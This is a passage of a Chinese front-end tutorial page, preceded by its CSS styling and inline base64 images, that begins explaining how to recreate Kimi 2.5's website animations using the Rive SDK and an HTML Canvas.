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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>最近Kimi2.5发布，官网的动画效果让人眼前一亮，灵动的交互反馈、细腻的动画过渡，给用户带来了极佳的视觉体验。本文将手把手教你使用Rive结合Canvas复刻这类动画效果，从核心原理到代码实现，让你轻松掌握交互式矢量动画的开发技巧。</p>
<h2 data-id="heading-0">一、技术选型与核心原理</h2>
<h3 data-id="heading-1">1. 为什么选择Rive？</h3>
<p>Rive（原Flare）是一款专注于交互式矢量动画的工具，支持跨平台运行，能将设计师制作的动画导出为<code>.riv</code>格式文件，通过其官方SDK可直接在Web端渲染。相比传统的GIF/视频，Rive动画体积小、可交互、支持矢量缩放不失真，完美契合网页端交互式动画的需求。</p>
<h3 data-id="heading-2">2. 核心实现逻辑</h3>
<ul>
<li>利用Canvas作为Rive动画的渲染容器，保证动画的高性能绘制；</li>
<li>通过Rive SDK解析动画文件，获取状态机中的输入参数（如鼠标坐标、触发事件）；</li>
<li>监听鼠标/触摸事件，实时更新Rive状态机的输入值，实现动画与用户交互的联动；</li>
<li>适配不同设备尺寸，保证动画在移动端/桌面端都能正常展示。</li>
</ul>
<h2 data-id="heading-3">二、实战开发步骤</h2>
<h3 data-id="heading-4">1. 环境准备</h3>
<p>无需复杂的构建工具，直接通过CDN引入Rive的Canvas版SDK即可：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/@rive-app/canvas@2.15.0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
</code></pre>
<h3 data-id="heading-5">2. 页面结构搭建</h3>
<p>首先创建基础的HTML结构，核心是一个Canvas容器，用于承载Rive动画：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span> 
